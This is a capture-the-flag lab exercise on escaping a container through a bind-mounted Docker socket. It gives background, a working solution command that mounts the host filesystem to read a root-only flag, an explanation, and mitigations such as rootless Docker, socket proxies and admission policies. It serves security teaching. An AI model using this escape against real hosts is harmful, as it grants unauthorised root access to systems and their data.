# Exercise 01 — The Docker socket *is* the host (capture the flag)

## Objective

You are given a container in which the host's Docker socket
(`/var/run/docker.sock`) has been bind-mounted. **Obtain a root shell on the**
**host and retrieve the marker file at `/root/flag.txt`.** The flag is owned by
root with mode `600`, so reading it proves you reached real host root — not just
container root.

## Pinned versions

* Docker CE **24.0.7**, containerd **1.6.28**
* Image base: `docker:24.0-cli`
* Ubuntu 22.04 guest (kernel 5.15)

## Background

The Docker daemon exposes its full control API over the Unix socket at `/var/run/docker.sock`, and the daemon runs as **root on the host**. Any process that can write to that socket can ask the daemon to do anything the daemon can do — including starting a new container that mounts the host's filesystem or shares the host's namespaces. So the container you're placed in has almost no privileges of its own, but the socket hands it the keys to the host.

## Foothold

``` bash
sudo ./setup.sh
docker exec -it ex01-socket-client sh
```

Confirm the naive read fails — this `/root` is the *container's*, and even if it
weren't, you're not host root yet:

``` sh
cat /root/flag.txt          # not the host flag
docker version              # note the Server section: it's the HOST daemon
```

## Solution

``` sh
# Check default location
if [ -S /var/run/docker.sock ]; then 
	echo "Docker socket found" 
else 
	echo "Socket not found at default path\n"
	exit -1
fi

docker -H unix:///var/run/docker.sock run -v /:/host --rm alpine cat "/host/root/flag.txt" 
```

## Why it works

* Write access to `docker.sock` is **root-equivalent**, with no lesser form.
* The daemon happily starts a container mounting `/` or sharing host namespaces;
that container runs as host root, so it can read any file, including a
`root:root` `600` flag.
* Mounting the socket into CI runners, "docker-in-docker" shortcuts, and
monitoring agents is a common real-world instance of exactly this setup.

## Mitigations — make this objective impossible

1. **Don't mount the socket.** For sibling-container needs, use a scoped
alternative rather than the raw socket.
2. **Rootless Docker / Podman:** the daemon no longer runs as host root, so a leaked socket can't yield host root.
3. **Socket proxy:** put a filtering proxy in front of the API exposing only the specific, ideally read-only, endpoints a workload truly needs (no
`container create`, no `bind mounts`).
4. **Treat `docker` group membership as admin** in threat models and access reviews.
5. **Detection / policy:** alert on — or block at admission — any container whose mounts include `docker.sock`.

Re-run the exercise after applying a mitigation (e.g. remove the `-v` socket
mount in `setup.sh`) and confirm the flag is now unreachable.

## Teardown

``` bash
sudo ./teardown.sh
```

Removes the client container, any sibling it spawned, the host flag, and the
image — returning the VM to baseline.